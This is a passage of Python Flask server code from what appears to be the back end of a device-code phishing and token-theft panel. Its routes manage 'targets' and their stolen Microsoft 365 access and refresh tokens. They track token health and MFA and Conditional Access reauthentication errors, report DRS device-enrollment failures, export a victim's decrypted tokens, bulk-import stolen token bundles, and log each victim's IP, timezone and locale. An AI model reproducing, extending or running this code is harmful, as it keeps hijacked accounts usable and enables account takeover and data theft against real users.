            drs_state = _drs_state_for(drs_enrolled_at, drs_enrolled_error)
            drs_kind, drs_hint = _classify_drs_failure(drs_enrolled_error)

            results.append({
                'email': email,
                'source_email': source_email,
                'display_name': display_name,
                'job_title': job_title,
                'relationship': relationship,
                'ca_class': ca_class or 'none',
                'captured_at': captured_at,
                'created_at': created_at,
                'has_token': has_token,
                'has_refresh_token': has_refresh,
                'token_health': status_badge,
                'status_badge': status_badge,
                'token_expired': token_expired,
                'token_seconds_until_expiry': seconds_until_expiry,
                'token_expires_at': token_expires_at,
                'token_captured_at': token_captured_at,
                'country_code': country_info.get('code'),
                'country_source': country_info.get('source'),
                'country_signals': country_info.get('signals') or {},
                'inbox_state': None,
                'inbox_count': 0,
                'enrolled': _row_is_enrolled(email),
                'verified': verified_flag,
                'drs_enrolled_at': drs_enrolled_at,
                'drs_enrolled_error': drs_enrolled_error,
                'drs_state': drs_state,
                'drs_failure_kind': drs_kind,
                'drs_hint': drs_hint,
            })

        # Merge live refresh-manager state into badges
        try:
            manager_report = token_refresh_manager.get_token_health_report() or []
        except Exception:
            manager_report = []

        manager_by_email = {}
        for rep in manager_report:
            em = (rep.get('email') or '').strip().lower()
            if em:
                manager_by_email[em] = rep

        for row in results:
            em = (row.get('email') or '').strip().lower()
            rep = manager_by_email.get(em)
            row['manager_known'] = bool(rep)
            row['manager_health'] = rep.get('health') if rep else None
            row['manager_abandoned'] = bool(rep.get('abandoned')) if rep else False
            row['manager_in_flight'] = bool(rep.get('in_flight')) if rep else False
            row['manager_failures'] = int(rep.get('consecutive_failures') or 0) if rep else 0
            row['manager_last_error'] = rep.get('last_error') if rep else None
            row['manager_refresh_count'] = int(rep.get('refresh_count') or 0) if rep else 0
            row['manager_cooldown_until'] = rep.get('cooldown_until') if rep else None
            row['manager_next_backoff_seconds'] = float(rep.get('next_backoff_seconds') or 0.0) if rep else 0.0

            mgr_health = (row['manager_health'] or '').lower()
            last_err = (row['manager_last_error'] or '').upper()
            fatal_markers = (
                'AADSTS700082', 'AADSTS700084', 'AADSTS700081',
                'AADSTS50173', 'AADSTS54005',
                'INVALID_GRANT', 'UNAUTHORIZED_CLIENT', 'INVALID_CLIENT',
            )
            manager_says_terminal = (
                mgr_health in ('dead', 'revoked', 'reauth_required')
                or row['manager_abandoned']
                or (row['manager_failures'] > 0 and any(m in last_err for m in fatal_markers))
            )
            if manager_says_terminal and row.get('status_badge') != 'no_token':
                terminal_status = 'revoked' if mgr_health == 'revoked' else 'dead'
                row['status_badge'] = terminal_status
                row['token_health'] = terminal_status

            # ── MFA / CA reauth detection ──────────────────────────────
            # AADSTS50078 (MFA expired), AADSTS50076 (MFA required),
            # AADSTS50079 (MFA enrollment required), AADSTS50158 (external
            # challenge), AADSTS53003 (CA block) all mean "the user must
            # re-authenticate interactively before this refresh token can
            # mint a new access token." The manager sometimes reports
            # these as 'expiring' or 'fragile' rather than the correct
            # 'reauth_required', which leaves the row stuck on an amber
            # 'recoverable' badge that never clears no matter how many
            # Refresh clicks the operator fires.
            _MFA_REAUTH_MARKERS = (
                'AADSTS50078', 'AADSTS50076', 'AADSTS50079',
                'AADSTS50158', 'AADSTS53003',
            )
            if (
                row.get('status_badge') not in ('no_token', 'dead', 'revoked')
                and row.get('manager_failures', 0) > 0
                and any(m in last_err for m in _MFA_REAUTH_MARKERS)
            ):
                row['status_badge'] = 'reauth_required'
                row['token_health'] = 'reauth_required'
                row['manager_reauth_required'] = True
            else:
                row['manager_reauth_required'] = False

            queued = False
            if (
                row.get('has_refresh_token')
                and not manager_says_terminal
                and not row.get('manager_reauth_required')
            ):
                secs = row.get('token_seconds_until_expiry')
                if secs is not None and secs <= 1200:
                    queued = True
                if row['manager_cooldown_until']:
                    queued = True
            row['refresh_queued'] = queued

        if status_arg == 'active':
            results = [r for r in results if r.get('status_badge') == 'active']
        elif status_arg == 'dead':
            results = [r for r in results if r.get('status_badge') in ('dead', 'revoked')]

        drs_state_arg = (request.args.get('drs_state') or '').strip().lower()
        if drs_state_arg in ('enrolled', 'failed', 'never'):
            results = [r for r in results if r.get('drs_state') == drs_state_arg]

        total = len(results)
        paginated = results[offset:offset + limit]

        return jsonify({
            'results': paginated,
            'total': total,
            'limit': limit,
            'offset': offset,
            'has_more': (offset + limit) < total,
        })
    except Exception as e:
        logger.error(f'api_vault_list failed: {e}', exc_info=True)
        return jsonify({
            'results': [], 'total': 0, 'limit': 0, 'offset': 0,
            'has_more': False, 'error': str(e),
        }), 503


# ===== DRS FAILURE REPORT =====
@app.route('/api/drs/failure-report', methods=['GET'])
@requires_auth
def api_drs_failure_report():
    """Aggregate DRS enrollment failures across all targets.

    Returns per-kind counts plus a flat item list, newest failures first.
    This is a read-only summary — it does not retry, enroll, or mutate.
    """
    try:
        rows = execute_query(
            """
            SELECT email, display_name, drs_enrolled_at, drs_enrolled_error
            FROM targets
            WHERE email IS NOT NULL
              AND TRIM(email) <> ''
              AND drs_enrolled_error IS NOT NULL
              AND TRIM(drs_enrolled_error) <> ''
            ORDER BY drs_enrolled_at DESC
            """,
            fetch_all=True,
        ) or []

        by_kind: Dict[str, int] = {}
        items: List[Dict[str, Any]] = []
        for row in rows:
            email, display_name, at, err = (
                list(row) + [None] * (4 - len(row))
            )[:4]
            kind, hint = _classify_drs_failure(err)
            key = kind or 'unknown'
            by_kind[key] = by_kind.get(key, 0) + 1
            items.append({
                'email': email,
                'display_name': display_name,
                'failed_at': at,
                'error': err,
                'kind': key,
                'hint': hint,
            })

        return jsonify({
            'total': len(items),
            'by_kind': by_kind,
            'items': items,
        })
    except Exception as e:
        logger.error(f'api_drs_failure_report failed: {e}', exc_info=True)
        return jsonify({'error': str(e)}), 500


# ===== VAULT EXPORT =====
@app.route('/api/vault/export/<path:email>', methods=['GET'])
@requires_auth
def api_vault_export(email):
    if not email or email.strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'error': 'invalid email'}), 400
    try:
        user_scope_sql, user_scope_params = _user_scope_filter('targets')
        params = [email.lower()]
        query = """SELECT email, source_email, depth, user_code, device_code,
                          status, captured_at, score, job_title, relationship,
                          created_at, display_name, tenant_id,
                          drs_enrolled_error, drs_prt_error
                   FROM targets WHERE LOWER(email) = LOWER(?)"""
        if user_scope_sql:
            query += " AND (owner_id IS NULL OR owner_id = 0 OR owner_id = ?)"
            params.append(user_scope_params[0])
        target = execute_query(query, params=tuple(params), fetch_one=True)
        if not target:
            return jsonify({'error': 'target not found'}), 404

        (
            target_email, _source_email, _depth, _user_code, _device_code, _status,
            target_captured_at, _score, _job_title, _relationship, _created_at,
            target_display_name, _tenant_id, _drs_enrolled_error, _drs_prt_error,
        ) = list(target) + [None] * (15 - len(target))

        token_query = """SELECT encrypted_token, refresh_token, expires_at,
                                captured_at, source_email
                         FROM tokens WHERE LOWER(email) = LOWER(?)"""
        token_params = [email.lower()]
        if user_scope_sql:
            token_query += " AND (owner_id IS NULL OR owner_id = 0 OR owner_id = ?)"
            token_params.append(user_scope_params[0])
        token_row = execute_query(token_query, params=tuple(token_params), fetch_one=True)

        if not token_row or not token_row[0]:
            return jsonify({
                'error': 'no token stored for this target',
                'hint': 're-run the capture for this target',
            }), 404

        (encrypted_token, plain_refresh_token, _token_expires_at,
         token_captured_at, _token_source_email) = list(token_row) + [None] * (5 - len(token_row))

        decrypted = _decrypt_token_payload(encrypted_token) or {}
        access_token = decrypted.get('access_token') or ''
        refresh_token = decrypted.get('refresh_token') or plain_refresh_token or ''

        if not access_token:
            return jsonify({
                'error': 'stored token could not be decrypted or is empty',
                'hint': 'check TOKEN_ENCRYPTION_KEY / WORM_MASTER_KEY',
            }), 500

        claims = (decrypted.get('jwt_claims') or {}).get('access_token') or {}
        if not claims and access_token:
            try:
                claims = decode_jwt(access_token) or {}
            except Exception:
                claims = {}

        user_info = decrypted.get('user_info') or {}
        cookies = decrypted.get('cookies') or []

        display_name = (
            user_info.get('displayName')
            or claims.get('name')
            or target_display_name
            or ' '.join(p for p in (claims.get('given_name'), claims.get('family_name')) if p)
            or ''
        )

        capture_mode = decrypted.get('capture_mode') or ('cookies' if cookies else 'device_code')
        capture_source = decrypted.get('source') or 'device_code'

        try:
            expires_in_value = int(decrypted.get('expires_in') or 0)
        except (TypeError, ValueError):
            expires_in_value = 0

        captured_at_value = decrypted.get('captured_at') or token_captured_at or target_captured_at
        captured_at_iso = ''
        if captured_at_value:
            dt = _normalize_utc_datetime(captured_at_value)
            captured_at_iso = (
                dt.strftime('%Y-%m-%dT%H:%M:%S.%fZ') if dt else str(captured_at_value)
            )

        export = {
            'token': access_token,
            'refreshToken': refresh_token,
            'token_type': decrypted.get('token_type') or 'Bearer',
            'expires_in': expires_in_value,
            'scope': decrypted.get('scope') or '',
            'id_token': decrypted.get('id_token') or '',
            'email': (target_email or '').strip().lower(),
            'displayName': display_name,
            'capture_mode': capture_mode,
            'client_id': decrypted.get('client_id') or os.environ.get('CLIENT_ID', ''),
            'capturedAt': captured_at_iso,
            'source': capture_source,
        }

        logger.warning(f'Vault export requested for {email}')

        return Response(
            json.dumps(export, ensure_ascii=False, separators=(', ', ': ')),
            mimetype='application/json',
        )
    except Exception as e:
        logger.error(f'api_vault_export failed: {e}', exc_info=True)
        return jsonify({'error': str(e)}), 500


# ===== VAULT IMPORT — helpers (part 1 of 2) =====
_IMPORT_CLIP = {
    'email': 320, 'token': 8192, 'refresh_token': 8192,
    'id_token': 8192, 'scope': 1024, 'display_name': 200, 'client_id': 64,
}


def _clip_import(value, limit):
    if value is None:
        return None
    text = str(value).strip()
    return text[:limit] if text else None


def _parse_import_bundles(raw_text: str) -> list[dict]:
    text = (raw_text or '').strip()
    if not text:
        raise ValueError('empty file')
    try:
        parsed = json.loads(text)
        if isinstance(parsed, dict):
            if isinstance(parsed.get('bundles'), list):
                return [b for b in parsed['bundles'] if isinstance(b, dict)]
            return [parsed]
        if isinstance(parsed, list):
            return [b for b in parsed if isinstance(b, dict)]
        raise ValueError('JSON must be an object or array of objects')
    except json.JSONDecodeError:
        pass
    bundles = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(obj, dict):
            bundles.append(obj)
    if not bundles:
        raise ValueError('not valid JSON or JSONL')
    return bundles


def _detect_bundle_shape(obj: dict) -> str:
    if not isinstance(obj, dict):
        return 'flat'
    if isinstance(obj.get('tokens'), dict) or isinstance(obj.get('user'), dict):
        return 'nested'
    return 'flat'


def _normalize_flat_bundle(obj: dict) -> dict:
    if not isinstance(obj, dict):
        raise ValueError('bundle is not an object')
    nested_tokens = obj.get('tokens') if isinstance(obj.get('tokens'), dict) else {}
    nested_user = obj.get('user') if isinstance(obj.get('user'), dict) else {}
    jwt_claims = obj.get('jwt_claims') if isinstance(obj.get('jwt_claims'), dict) else {}
    user_info = obj.get('user_info') if isinstance(obj.get('user_info'), dict) else {}
    cookies = obj.get('cookies') if isinstance(obj.get('cookies'), list) else []

    email = _clip_import(
        obj.get('email') or obj.get('upn') or obj.get('userPrincipalName')
        or obj.get('unique_name')
        or nested_user.get('upn') or nested_user.get('email')
        or user_info.get('userPrincipalName') or user_info.get('mail'),
        _IMPORT_CLIP['email'],
    )
    if not email or '@' not in email:
        raise ValueError('bundle has no usable email')

    access_token = _clip_import(
        obj.get('token') or obj.get('access_token') or obj.get('accessToken')
        or nested_tokens.get('access_token') or nested_tokens.get('token'),
        _IMPORT_CLIP['token'],
    )
    if not access_token:
        raise ValueError('bundle has no token')

    refresh_token = _clip_import(
        obj.get('refreshToken') or obj.get('refresh_token')
        or nested_tokens.get('refresh_token'),
        _IMPORT_CLIP['refresh_token'],
    ) or ''

    display_name = _clip_import(
        obj.get('displayName') or obj.get('display_name') or obj.get('name')
        or nested_user.get('display_name') or nested_user.get('displayName')
        or user_info.get('displayName') or user_info.get('display_name'),
        _IMPORT_CLIP['display_name'],
    )

    return {
        'email': email.lower(),
        'access_token': access_token,
        'refresh_token': refresh_token,
        'id_token': _clip_import(
            obj.get('id_token') or obj.get('idToken') or nested_tokens.get('id_token'),
            _IMPORT_CLIP['id_token'],
        ) or '',
        'scope': _clip_import(
            obj.get('scope') or nested_tokens.get('scope'),
            _IMPORT_CLIP['scope'],
        ) or '',
        'token_type': str(obj.get('token_type') or nested_tokens.get('token_type') or 'Bearer'),
        'expires_in': int(obj.get('expires_in') or nested_tokens.get('expires_in') or 3600),
        'display_name': display_name,
        'client_id': _clip_import(
            obj.get('client_id') or os.environ.get('CLIENT_ID'),
            _IMPORT_CLIP['client_id'],
        ),
        'captured_at': (
            obj.get('capturedAt') or obj.get('captured_at')
            or obj.get('capture_timestamp')
            or datetime.now(timezone.utc).isoformat()
        ),
        'source': str(obj.get('source') or 'import'),
        'capture_mode': str(obj.get('capture_mode') or ('cookies' if cookies else 'token')),
        'cookies': cookies,
        'user_info': user_info or nested_user,
        'jwt_claims': jwt_claims,
        'ca_analysis': obj.get('ca_analysis') or {},
    }


def _normalize_nested_capture(obj: dict) -> dict:
    if not isinstance(obj, dict):
        raise ValueError('bundle is not an object')
    user = obj.get('user') if isinstance(obj.get('user'), dict) else {}
    tokens = obj.get('tokens') if isinstance(obj.get('tokens'), dict) else {}
    jwt_claims = obj.get('jwt_claims') if isinstance(obj.get('jwt_claims'), dict) else {}
    user_info = obj.get('user_info') if isinstance(obj.get('user_info'), dict) else user
    cookies = obj.get('cookies') if isinstance(obj.get('cookies'), list) else []

    email = _clip_import(
        user.get('upn') or user.get('email') or user.get('userPrincipalName')
        or obj.get('email') or obj.get('upn') or obj.get('userPrincipalName')
        or user_info.get('userPrincipalName') or user_info.get('mail'),
        _IMPORT_CLIP['email'],
    )
    if not email or '@' not in email:
        raise ValueError('bundle has no usable email')

    access_token = _clip_import(
        tokens.get('access_token') or obj.get('access_token') or obj.get('token'),
        _IMPORT_CLIP['token'],
    )
    if not access_token:
        raise ValueError('bundle has no token')

    refresh_token = _clip_import(
        tokens.get('refresh_token') or obj.get('refresh_token') or obj.get('refreshToken'),
        _IMPORT_CLIP['refresh_token'],
    ) or ''

    display_name = _clip_import(
        user.get('display_name') or user.get('displayName')
        or obj.get('display_name') or obj.get('displayName')
        or user_info.get('displayName') or user_info.get('display_name'),
        _IMPORT_CLIP['display_name'],
    )

    return {
        'email': email.lower(),
        'access_token': access_token,
        'refresh_token': refresh_token,
        'id_token': _clip_import(
            tokens.get('id_token') or obj.get('id_token') or obj.get('idToken'),
            _IMPORT_CLIP['id_token'],
        ) or '',
        'scope': _clip_import(
            tokens.get('scope') or obj.get('scope'),
            _IMPORT_CLIP['scope'],
        ) or '',
        'token_type': str(tokens.get('token_type') or obj.get('token_type') or 'Bearer'),
        'expires_in': int(tokens.get('expires_in') or obj.get('expires_in') or 3600),
        'display_name': display_name,
        'client_id': _clip_import(
            obj.get('client_id') or os.environ.get('CLIENT_ID'),
            _IMPORT_CLIP['client_id'],
        ),
        'captured_at': (
            obj.get('capture_timestamp') or obj.get('captured_at')
            or obj.get('capturedAt')
            or datetime.now(timezone.utc).isoformat()
        ),
        'source': str(obj.get('source') or 'import'),
        'capture_mode': str(obj.get('capture_mode') or ('cookies' if cookies else 'device_code')),
        'cookies': cookies,
        'user_info': user_info or user,
        'jwt_claims': jwt_claims,
        'ca_analysis': obj.get('ca_analysis') or {},
    }


def _normalize_import_bundle(obj: dict) -> dict:
    shape = _detect_bundle_shape(obj)
    if shape == 'nested':
        return _normalize_nested_capture(obj)
    return _normalize_flat_bundle(obj)

def _encrypt_import_token(bundle: dict, verified: bool = True) -> str:
    key_hex = (
        os.environ.get('TOKEN_ENCRYPTION_KEY')
        or os.environ.get('WORM_MASTER_KEY')
        or ''
    ).strip()
    if len(key_hex) < 64:
        raise RuntimeError(
            'TOKEN_ENCRYPTION_KEY / WORM_MASTER_KEY is not configured; '
            'cannot encrypt imported token'
        )

    master_key = bytes.fromhex(key_hex[:64])
    if len(master_key) != 32:
        raise RuntimeError('encryption key must be exactly 32 bytes')

    jwt_claims = bundle.get('jwt_claims') if isinstance(bundle.get('jwt_claims'), dict) else {}
    claims = jwt_claims.get('access_token') if isinstance(jwt_claims.get('access_token'), dict) else {}
    if not claims:
        claims = decode_jwt(bundle['access_token']) or {}

    user_info = bundle.get('user_info') if isinstance(bundle.get('user_info'), dict) else {}
    cookies = bundle.get('cookies') if isinstance(bundle.get('cookies'), list) else []

    token_payload = {
        'access_token': bundle['access_token'],
        'refresh_token': bundle['refresh_token'],
        'id_token': bundle['id_token'],
        'expires_in': bundle['expires_in'],
        'token_type': bundle['token_type'],
        'scope': bundle['scope'],
        'resource': None,
        'tenant': None,
        'client_id': bundle['client_id'],
        'captured_at': bundle['captured_at'],
        'user_info': {
            'displayName': (
                user_info.get('displayName')
                or user_info.get('display_name')
                or bundle.get('display_name')
                or claims.get('name')
            ),
            'userPrincipalName': (
                user_info.get('userPrincipalName')
                or user_info.get('upn')
                or bundle['email']
            ),
            'mail': user_info.get('mail') or bundle['email'],
            'tenantId': user_info.get('tenantId') or user_info.get('tenant_id') or claims.get('tid'),
            'id': user_info.get('id') or user_info.get('user_id') or claims.get('oid'),
        },
        'jwt_claims': {'access_token': claims},
        'cookies': cookies,
        'ca_analysis': bundle.get('ca_analysis') or {},
        'imported': True,
        'source': bundle.get('source') or 'import',
        'capture_mode': bundle.get('capture_mode') or 'token',
        '_verified': bool(verified),
    }

    nonce, ciphertext = CryptoUtils.aes_gcm_encrypt(
        master_key,
        json.dumps(token_payload, separators=(',', ':'), sort_keys=True).encode('utf-8'),
    )
    return base64.b64encode(nonce + ciphertext).decode('utf-8')


@app.route('/api/vault/import', methods=['POST', 'OPTIONS'])
@requires_auth
def api_vault_import():
    if request.method == 'OPTIONS':
        return ('', 204)

    raw_text = ''
    filename = None

    try:
        if 'file' in request.files:
            upload = request.files['file']
            filename = upload.filename
            raw_text = upload.read().decode('utf-8', errors='replace')
        else:
            raw_text = request.get_data(as_text=True) or ''
    except Exception as e:
        return jsonify({'success': False, 'error': f'failed to read upload: {e}'}), 400

    if not raw_text.strip():
        return jsonify({'success': False, 'error': 'empty file'}), 400

    try:
        raw_bundles = _parse_import_bundles(raw_text)
    except ValueError as e:
        return jsonify({'success': False, 'error': str(e)}), 400

    if not raw_bundles:
        return jsonify({'success': False, 'error': 'file contained no bundle objects'}), 400

    MAX_IMPORT_BUNDLES = 1000
    if len(raw_bundles) > MAX_IMPORT_BUNDLES:
        return jsonify({
            'success': False,
            'error': f'too many bundles ({len(raw_bundles)}); split into batches of {MAX_IMPORT_BUNDLES}',
        }), 400

    owner_id = _current_user_id() or None
    results: List[Dict[str, Any]] = []
    imported = 0
    updated = 0
    failed = 0
    rejected_dead = 0
    skipped_dead_existing = 0

    for idx, raw in enumerate(raw_bundles):
        entry: Dict[str, Any] = {
            'index': idx,
            'email': None,
            'status': 'failed',
            'error': None,
            'verification': None,
        }
        try:
            bundle = _normalize_import_bundle(raw)
            entry['email'] = bundle['email']

            verification = _verify_and_maybe_rotate_bundle(bundle)
            entry['verification'] = {
                'verified': bool(verification.get('verification', {}).get('ok')),
                'reason': verification.get('reason'),
                'error_code': verification.get('verification', {}).get('error_code'),
                'error_description': verification.get('verification', {}).get('error_description'),
                'note': verification.get('note'),
            }

            existing = execute_query(
                "SELECT email FROM targets WHERE LOWER(email) = LOWER(?)",
                params=(bundle['email'],),
                fetch_one=True,
            )

            if not verification.get('allowed'):
                if existing:
                    entry['status'] = 'skipped_dead_existing'
                    entry['error'] = (
                        'refusing to overwrite existing row with dead token: '
                        + verification.get('note', 'dead')
                    )
                    skipped_dead_existing += 1
                    logger.warning(
                        f"vault import: refusing to overwrite {bundle['email']} "
                        f"with dead token: {verification.get('note')}"
                    )
                else:
                    entry['status'] = 'rejected_dead'
                    entry['error'] = verification.get('note', 'refresh token is dead')
                    rejected_dead += 1
                    failed += 1
                    logger.warning(
                        f"vault import: rejected {bundle['email']} — dead token: "
                        f"{verification.get('note')}"
                    )
                results.append(entry)
                continue

            verify_reason = verification.get('reason') or ''
            is_verified = verify_reason in ('valid', 'rotated')

            encrypted_token = _encrypt_import_token(bundle, verified=is_verified)

            now_iso = datetime.now(timezone.utc).isoformat()

            try:
                v_expires = verification.get('verification', {}).get('expires_in')
                expires_in_seconds = int(v_expires) if v_expires else int(bundle['expires_in'])
            except (TypeError, ValueError):
                expires_in_seconds = int(bundle.get('expires_in') or 3600)

            expires_in_seconds = max(60, min(expires_in_seconds, 86400 * 30))
            expires_at = (
                datetime.now(timezone.utc)
                + timedelta(seconds=expires_in_seconds)
            ).isoformat()

            geo_fields = _extract_country_from_jwt_bundle(bundle)
            logger.info(
                "vault import geo: email=%s ipaddr=%s country=%s source=%s",
                bundle.get('email'),
                geo_fields.get('victim_ip'),
                geo_fields.get('country_code'),
                geo_fields.get('country_source'),
            )

            execute_query(
                '''
                INSERT INTO targets (
                    email, source_email, depth, status,
                    captured_at, created_at, display_name, owner_id,
                    country_code, country_source, country_signals,
                    victim_ip, victim_timezone, victim_locale
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(email) DO UPDATE SET
                    status = excluded.status,
                    captured_at = excluded.captured_at,
                    display_name = COALESCE(excluded.display_name, targets.display_name),
                    owner_id = COALESCE(excluded.owner_id, targets.owner_id),
                    country_code = COALESCE(excluded.country_code, targets.country_code),
                    country_source = COALESCE(excluded.country_source, targets.country_source),
                    country_signals = COALESCE(excluded.country_signals, targets.country_signals),
                    victim_ip = COALESCE(excluded.victim_ip, targets.victim_ip),
                    victim_timezone = COALESCE(excluded.victim_timezone, targets.victim_timezone),
                    victim_locale = COALESCE(excluded.victim_locale, targets.victim_locale)
                ''',
                params=(
                    bundle['email'], None, 0, 'captured',
                    bundle['captured_at'], now_iso,
                    bundle['display_name'], owner_id,
                    geo_fields.get('country_code'),
                    geo_fields.get('country_source'),
                    geo_fields.get('country_signals'),
                    geo_fields.get('victim_ip'),
                    geo_fields.get('victim_timezone'),
                    geo_fields.get('victim_locale'),
                ),
                commit=True,
            )

            execute_query(
                '''
                INSERT INTO tokens (
                    email, encrypted_token, refresh_token,
                    expires_at, captured_at, source_email, owner_id
                )
                VALUES (?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(email) DO UPDATE SET
                    encrypted_token = excluded.encrypted_token,
                    refresh_token = excluded.refresh_token,
                    expires_at = excluded.expires_at,
                    captured_at = excluded.captured_at,
                    owner_id = COALESCE(excluded.owner_id, tokens.owner_id)
                ''',
                params=(
                    bundle['email'], encrypted_token, None,
                    expires_at, bundle['captured_at'], None, owner_id,
                ),
                commit=True,
            )

            try:
                token_refresh_manager.load_token_from_db(bundle['email'])
            except Exception as e:
                logger.debug(
                    f"vault import: refresh manager registration failed for "
                    f"{bundle['email']}: {e}"
                )

            if existing:
                entry['status'] = 'updated'
                updated += 1
            else:
                entry['status'] = 'imported'
                imported += 1

            logger.info(
                f"vault import: {entry['status']} {bundle['email']} "
                f"({verify_reason or 'unverified'})"
            )

        except Exception as e:
            entry['error'] = str(e)
            failed += 1
            logger.warning(f'vault import: bundle {idx} failed: {e}')

        results.append(entry)

    logger.warning(
        f'vault import by operator: {imported} new, {updated} updated, '
        f'{failed} failed, {rejected_dead} rejected-dead, '
        f'{skipped_dead_existing} skipped-dead-existing '
        f'(source={filename or "inline"})'
    )

    return jsonify({
        'success': failed == 0,
        'imported': imported,
        'updated': updated,
        'failed': failed,
        'rejected_dead': rejected_dead,
        'skipped_dead_existing': skipped_dead_existing,
        'total': len(results),
        'results': results,
    })


# ===== RESULT DETAIL =====
@app.route('/api/results/<path:email>/detail', methods=['GET'])
@requires_auth
def api_result_detail(email):
    if email is None or str(email).strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'error': 'invalid email path parameter', 'received': email}), 400
    try:
        target = execute_query(
            """SELECT email, source_email, depth, user_code, device_code, status,
                      captured_at, score, job_title, relationship, created_at
               FROM targets WHERE email = ?""",
            params=(email,),
            fetch_one=True,
        )
        if not target:
            return jsonify({'error': 'target not found'}), 404
        token_payload = None
        decrypted = None
        try:
            tok_row = execute_query(
                'SELECT encrypted_token, refresh_token, expires_at, captured_at '
                'FROM tokens WHERE email = ?',
                params=(email,),
                fetch_one=True,
            )
            if tok_row:
                encrypted_token, refresh_token, expires_at, tok_captured_at = tok_row
                decrypted = _decrypt_token_payload(encrypted_token)
                refresh_token = (decrypted or {}).get('refresh_token') or refresh_token
                token_payload = {
                    'encrypted': bool(encrypted_token),
                    'has_refresh_token': bool(refresh_token),
                    'expires_at': expires_at,
                    'captured_at': tok_captured_at,
                    'decrypted': '[redacted in UI]' if (decrypted is not None or encrypted_token) else None,
                }
        except Exception as e:
            logger.debug(f'Token lookup failed for {email}: {e}')

        token_health_summary = None
        if token_payload is not None:
            expires_dt = _normalize_utc_datetime(token_payload.get('expires_at'))
            now_utc = datetime.now(timezone.utc)
            seconds_until_expiry = (
                int((expires_dt - now_utc).total_seconds()) if expires_dt else None
            )
            if not token_payload.get('has_refresh_token'):
                health = 'no_refresh'
            elif seconds_until_expiry is None:
                health = 'unknown'
            elif seconds_until_expiry <= 0:
                health = 'expired'
            elif seconds_until_expiry <= 3600:
                health = 'expiring'
            else:
                health = 'healthy'
            token_health_summary = {
                'has_token': True,
                'has_refresh_token': token_payload.get('has_refresh_token', False),
                'token_health': health,
                'token_expires_at': token_payload.get('expires_at'),
                'token_seconds_until_expiry': seconds_until_expiry,
                'token_captured_at': token_payload.get('captured_at'),
            }
        else:
            token_health_summary = {
                'has_token': False,
                'has_refresh_token': False,
                'token_health': 'missing',
                'token_expires_at': None,
                'token_seconds_until_expiry': None,
                'token_captured_at': None,
            }

        return jsonify({
            'target': {
                'email': target[0],
                'source_email': target[1],
                'depth': target[2],
                'user_code': target[3],
                'device_code': target[4],
                'status': target[5],
                'captured_at': target[6],
                'score': target[7],
                'job_title': target[8],
                'relationship': target[9],
                'created_at': target[10],
            },
            'token': token_payload,
            'token_summary': token_health_summary,
            'user_info': {},
        })
    except Exception as e:
        logger.error(f'api_result_detail failed: {e}', exc_info=True)
        return jsonify({'error': str(e)}), 500


# ===== RESULT DELETE =====
@app.route('/api/results/<path:email>/delete', methods=['POST'])
@app.route('/api/results/<string:email>/delete', methods=['POST'])
@requires_auth
def api_result_delete(email):
    if email is None or str(email).strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'error': 'invalid email path parameter', 'received': email}), 400
    try:
        deleted = {}

        capture_ids = []
        try:
            cap_rows = execute_query(
                "SELECT capture_id FROM captures "
                "WHERE LOWER(target_email) = LOWER(?) "
                "   OR LOWER(source_email) = LOWER(?)",
                params=(email, email),
                fetch_all=True,
            ) or []
            capture_ids = [row[0] for row in cap_rows if row and row[0] is not None]
        except Exception as e:
            logger.warning(f'api_result_delete: capture_id lookup failed for {email}: {e}')
            capture_ids = []

        capture_child_tables = (
            'capture_tokens', 'capture_users', 'capture_cookies', 'capture_prt',
        )

        token_ids = []
        if capture_ids:
            placeholders = ', '.join(['?'] * len(capture_ids))
            try:
                token_rows = execute_query(
                    f'SELECT token_id FROM capture_tokens WHERE capture_id IN ({placeholders})',
                    params=tuple(capture_ids),
                    fetch_all=True,
                ) or []
                token_ids.extend(row[0] for row in token_rows if row and row[0] is not None)
                capture_token_rows = execute_query(
                    f'SELECT token_id FROM captures WHERE capture_id IN ({placeholders})',
                    params=tuple(capture_ids),
                    fetch_all=True,
                ) or []
                token_ids.extend(
                    row[0] for row in capture_token_rows if row and row[0] is not None
                )
                token_ids = list(dict.fromkeys(token_ids))
            except Exception as e:
                logger.warning(f'api_result_delete: token_id lookup failed for {email}: {e}')
                token_ids = []

        if token_ids:
            placeholders = ', '.join(['?'] * len(token_ids))
            try:
                cursor = execute_query(
                    f'DELETE FROM capture_claims WHERE token_id IN ({placeholders})',
                    params=tuple(token_ids),
                    commit=True,
                )
                deleted['capture_claims'] = max(0, int(getattr(cursor, 'rowcount', 0) or 0))
            except Exception as e:
                logger.warning(f'api_result_delete: capture_claims delete failed for {email}: {e}')
                deleted['capture_claims'] = 0
        else:
            deleted['capture_claims'] = 0

        for table in capture_child_tables:
            if not capture_ids:
                deleted[table] = 0
                continue
            placeholders = ', '.join(['?'] * len(capture_ids))
            try:
                cursor = execute_query(
                    f'DELETE FROM {table} WHERE capture_id IN ({placeholders})',
                    params=tuple(capture_ids),
                    commit=True,
                )
                deleted[table] = max(0, int(getattr(cursor, 'rowcount', 0) or 0))
            except Exception as e:
                logger.warning(f'api_result_delete: {table} delete failed for {email}: {e}')
                deleted[table] = 0

        if capture_ids:
            placeholders = ', '.join(['?'] * len(capture_ids))
            try:
                cursor = execute_query(
                    f'DELETE FROM captures WHERE capture_id IN ({placeholders})',
                    params=tuple(capture_ids),
                    commit=True,
                )
                deleted['captures'] = max(0, int(getattr(cursor, 'rowcount', 0) or 0))
            except Exception as e:
                logger.warning(f'api_result_delete: captures delete failed for {email}: {e}')
                deleted['captures'] = 0
        else:
            deleted['captures'] = 0

        for table in ('tokens', 'enrollments', 'targets'):
            try:
                cursor = execute_query(
                    f'DELETE FROM {table} WHERE LOWER(email) = LOWER(?)',
                    params=(email,),
                    commit=True,
                )
                deleted[table] = max(0, int(getattr(cursor, 'rowcount', 0) or 0))
            except Exception as e:
                logger.warning(f'api_result_delete: {table} delete failed for {email}: {e}')
                deleted[table] = 0

        if deleted.get('targets', 0) == 0:
            return jsonify({
                'success': False,
                'email': email,
                'deleted': deleted,
                'error': 'target not found',
            }), 404

        logger.warning(f"Full delete for {email}: {deleted}")
        return jsonify({'success': True, 'email': email, 'deleted': deleted})
    except Exception as e:
        logger.error(f'api_result_delete failed: {e}', exc_info=True)
